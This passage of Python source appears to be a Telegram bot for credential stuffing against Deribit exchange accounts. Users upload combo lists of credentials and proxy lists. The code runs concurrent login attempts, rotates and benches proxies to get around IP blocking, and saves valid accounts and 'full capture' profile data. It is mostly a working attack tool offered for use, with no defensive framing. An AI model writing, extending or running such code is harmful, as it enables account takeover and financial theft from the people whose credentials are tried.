async def run_proxy_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await _run_proxy_check_impl(update, ctx)


# ---------- run ----------
async def _start_run_impl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    q = update.callback_query

    if uid in RUNNING:
        await _safe_reply(q.message, "already running. hit STOP first.")
        return
    combos = load_combos(uid)
    if not combos:
        await _safe_reply(q.message, "no combos.txt â€” upload one first.")
        return

    mode = USE_PROXY.get(uid, None)
    pool = PROXY_CACHE.get(uid, [])
    if mode is False:
        proxy_pool, note = [], "direct (proxies OFF)"
    elif pool:
        proxy_pool, note = list(pool), f"{len(pool)} proxies"
    elif mode is True:
        await _safe_reply(q.message, "proxies ON but none loaded â€” run Check Proxies first.")
        return
    else:
        proxy_pool, note = [], "direct (no proxies loaded)"

    threads = get_threads(uid)
    if proxy_pool:
        threads = min(threads, max(len(proxy_pool) * 2, 2))

    RUNNING.add(uid)
    valids_file(uid).write_text("", encoding="utf-8")
    invalids_file(uid).write_text("", encoding="utf-8")
    hits_file(uid).write_text("", encoding="utf-8")
    full_capture_file(uid).write_text("", encoding="utf-8")

    total = len(combos)
    done = valids = invalids = 0
    started = time.time()
    reason_counts: dict[str, int] = {}

    status_msg = await _safe_reply(
        q.message,
        f"â–¶ï¸ started\n{total} combos Â· {threads} workers Â· {esc(note)}\n"
        f"rotation: on (IP errors bench proxy {ROTATION_COOLDOWN}s)",
        parse_mode="HTML",
    )
    if status_msg is None:
        RUNNING.discard(uid)
        return

    stop_typing = asyncio.Event()
    typing_task = asyncio.create_task(_typing_loop(q.message.chat_id, ctx, stop_typing))

    sem = asyncio.Semaphore(threads)
    last_edit = 0.0
    edit_lock = asyncio.Lock()

    def pick_proxy(idx: int, exclude: set[str] | None = None) -> dict | None:
        if not proxy_pool:
            return None
        n = len(proxy_pool)
        exclude = exclude or set()
        for offset in range(n):
            p = proxy_pool[(idx + offset) % n]
            key = proxy_url(p)
            if key in exclude:
                continue
            if proxy_is_benched(uid, p):
                continue
            return p
        for offset in range(n):
            p = proxy_pool[(idx + offset) % n]
            if proxy_url(p) not in exclude:
                return p
        return None

    async def worker(combo: str, idx: int):
        nonlocal done, valids, invalids, last_edit
        if uid not in RUNNING:
            return

        tried_proxies: set[str] = set()
        attempt = 0
        combo_out = combo
        status = "INVALID"
        reason = "NO_ATTEMPT"
        profile = None

        while attempt < MAX_RETRIES_PER_COMBO:
            if uid not in RUNNING:
                return
            proxy = pick_proxy(idx + attempt, exclude=tried_proxies)
            if proxy is not None:
                tried_proxies.add(proxy_url(proxy))

            combo_out, status, reason, profile = await try_login_full(
                combo, proxy, uid, MIN_DELAY, MAX_DELAY
            )

            if status == "VALID":
                break

            code = reason.split(" â€” ", 1)[0] if " â€” " in reason else reason

            if code in ACCOUNT_DEAD_CODES:
                break

            if code in IP_ERROR_CODES:
                if proxy is not None:
                    bench_proxy(uid, proxy, ROTATION_COOLDOWN)
                attempt += 1
                if attempt < MAX_RETRIES_PER_COMBO:
                    backoff = RETRY_BACKOFF_BASE * (2 ** (attempt - 1))
                    backoff += random.uniform(0, 1.0)
                    await asyncio.sleep(backoff)
                    continue
                break

            if attempt == 0 and len(proxy_pool) > 1:
                attempt += 1
                continue
            break

        if attempt >= MAX_RETRIES_PER_COMBO and status != "VALID":
            reason = f"RETRY_EXHAUSTED â€” {reason}"

        async with (valid_lock if status == "VALID" else invalid_lock):
            write_result(uid, combo_out, status, reason, profile)
            if status == "VALID":
                valids += 1
            else:
                invalids += 1
            code = reason.split(" â€” ", 1)[0] if " â€” " in reason else reason
            reason_counts[code] = reason_counts.get(code, 0) + 1
            done += 1

        now = time.time()
        async with edit_lock:
            if done % EDIT_EVERY == 0 or now - last_edit > 1.2 or done == total:
                elapsed = max(now - started, 0.01)
                cps = done / elapsed
                eta = (total - done) / max(cps, 0.01)
                top = sorted(reason_counts.items(), key=lambda x: -x[1])[:5]
                top_line = " Â· ".join(f"{k}:{v}" for k, v in top)
                if proxy_pool:
                    benched = sum(1 for p in proxy_pool if proxy_is_benched(uid, p))
                    live = len(proxy_pool) - benched
                    p_line = f"ðŸŒ proxies: <code>{live}</code> live Â· <code>{benched}</code> benched\n"
                else:
                    p_line = ""
                await _safe_edit(
                    status_msg,
                    f"â–¶ï¸ running\n\n"
                    f"ðŸ“Š {done}/{total}  Â·  <code>{cps:.2f}/s</code>  Â·  ETA <code>{int(eta)}s</code>\n"
                    f"âœ… valids: <code>{valids}</code>\n"
                    f"âŒ invalids: <code>{invalids}</code>\n"
                    f"{p_line}"
                    f"<code>{esc(top_line)}</code>",
                    parse_mode="HTML",
                )
                last_edit = now

    async def bounded(combo: str, idx: int):
        async with sem:
            await worker(combo, idx)

    try:
        await asyncio.gather(*(bounded(c, i) for i, c in enumerate(combos)))
    finally:
        stop_typing.set()
        try:
            await asyncio.wait_for(typing_task, timeout=2.0)
        except Exception:
            typing_task.cancel()
        RUNNING.discard(uid)
        save_bench_state(uid)

    elapsed = time.time() - started
    top = sorted(reason_counts.items(), key=lambda x: -x[1])
    top_lines = "\n".join(f"  {k}: {v}" for k, v in top[:10])

    await _safe_edit(
        status_msg,
        f"âœ… done.\n\n"
        f"ðŸ“Š total: <code>{total}</code> in <code>{elapsed:.1f}s</code>\n"
        f"âœ… valids: <code>{valids}</code>\n"
        f"âŒ invalids: <code>{invalids}</code>\n\n"
        f"<b>invalid reasons:</b>\n<code>{esc(top_lines)}</code>\n\n"
        f"ðŸ“„ Valids / ðŸŽ¯ Hits / ðŸ“„ Invalids / ðŸ“¦ Full Capture",
        parse_mode="HTML",
    )
    await show_main(update, ctx, edit=False)


@_isolate("start_run")
async def start_run(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        await asyncio.wait_for(RUN_SEM.acquire(), timeout=3.0)
    except asyncio.TimeoutError:
        if update.callback_query:
            await _safe_reply(update.callback_query.message,
                              "â³ too many runs active â€” try again in a bit.")
        return
    try:
        await _start_run_impl(update, ctx)
    finally:
        RUN_SEM.release()


# ---------- buttons ----------
async def _on_button_impl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = update.effective_user.id
    await _safe_answer(q)
    action = q.data.split(":", 1)[1] if ":" in q.data else q.data

    if action == "start":
        await start_run(update, ctx)
        return
    if action == "check_proxies":
        await run_proxy_check(update, ctx)
        return

    async with _bubble(q.message) as (bubble, state):
        if action == "upload_combos":
            AWAIT_MODE[uid] = "combos"
        elif action == "upload_proxies":
            AWAIT_MODE[uid] = "proxies"
        elif action == "stop":
            if uid in RUNNING:
                RUNNING.discard(uid)
                if bubble:
                    state["edited"] = True
                    await _safe_edit(bubble, "â¹ stop sent.")
                return
            else:
                if bubble:
                    state["edited"] = True
                    await _safe_edit(bubble, "nothing running.")
                return
        elif action == "refresh":
            pass
        elif action in ("t2", "t4", "t8"):
            THREADS_PER_USER[uid] = int(action[1:])
        elif action == "cycle_proxy":
            cur = USE_PROXY.get(uid, None)
            USE_PROXY[uid] = True if cur is None else (False if cur is True else None)
        elif action == "unbench":
            BENCHED_PROXIES[uid] = {}
            save_bench_state(uid)
        elif action in ("valids", "hits", "invalids", "fullcap", "good_proxies"):
            filemap = {
                "valids": (valids_file(uid), "valids"),
                "hits": (hits_file(uid), "hits"),
                "invalids": (invalids_file(uid), "invalids"),
                "fullcap": (full_capture_file(uid), "full_capture.jsonl"),
                "good_proxies": (good_proxies_file(uid), "good_proxies.txt"),
            }
            p, cap = filemap[action]
            if not p.exists() or p.stat().st_size == 0:
                if bubble:
                    state["edited"] = True
                    await _safe_edit(bubble, f"{cap} empty.")
                return
            if bubble:
                await _safe_delete(bubble)
                state["edited"] = True
            await _safe_send_doc(q.message, p.open("rb"), caption=cap)
            return
        elif action == "clear":
            valids_file(uid).write_text("", encoding="utf-8")
            invalids_file(uid).write_text("", encoding="utf-8")
            hits_file(uid).write_text("", encoding="utf-8")
            full_capture_file(uid).write_text("", encoding="utf-8")

        if bubble:
            await _safe_delete(bubble)
            state["edited"] = True
        await show_main(update, ctx, edit=False)


@_isolate("on_button")
async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await _on_button_impl(update, ctx)


# ---------- file ingest ----------
async def _on_file_impl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    doc = update.message.document
    if not doc:
        return
    name = (doc.file_name or "").lower()

    async with _bubble(update.message, "â³ <i>receiving file...</i>") as (bubble, state):
        file = await ctx.bot.get_file(doc.file_id)

        awaiting = AWAIT_MODE.get(uid)
        if awaiting == "combos":
            target = combos_file(uid); AWAIT_MODE[uid] = None
        elif awaiting == "proxies":
            target = proxies_file(uid); AWAIT_MODE[uid] = None
        elif "prox" in name:
            target = proxies_file(uid)
        else:
            target = combos_file(uid)

        await file.download_to_drive(str(target))

        if target.name == "proxies.txt":
            parsed = []
            for ln in load_proxies(uid):
                p = parse_proxy(ln)
                if p:
                    parsed.append(p)
            PROXY_CACHE[uid] = []
            if bubble:
                state["edited"] = True
                await _safe_edit(
                    bubble,
                    f"âœ… proxies.txt saved â€” {len(load_proxies(uid))} lines loaded.\n"
                    f"tap ðŸ§ª Check Proxies to test them.",
                    parse_mode="HTML",
                )
        else:
            if bubble:
                state["edited"] = True
                await _safe_edit(bubble, f"âœ… combos.txt saved â€” {len(load_combos(uid))} lines.")

    await show_main(update, ctx, edit=False)


@_isolate("on_file")
async def on_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await _on_file_impl(update, ctx)


# ---------- shutdown ----------
async def _shutdown(app):
    await close_all_clients()


def main():
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .post_shutdown(_shutdown)
        .build()
    )
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
    app.add_error_handler(_on_error)
    print("Deribit full-capture v2.6 up. auth fallback armed. 6767.")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
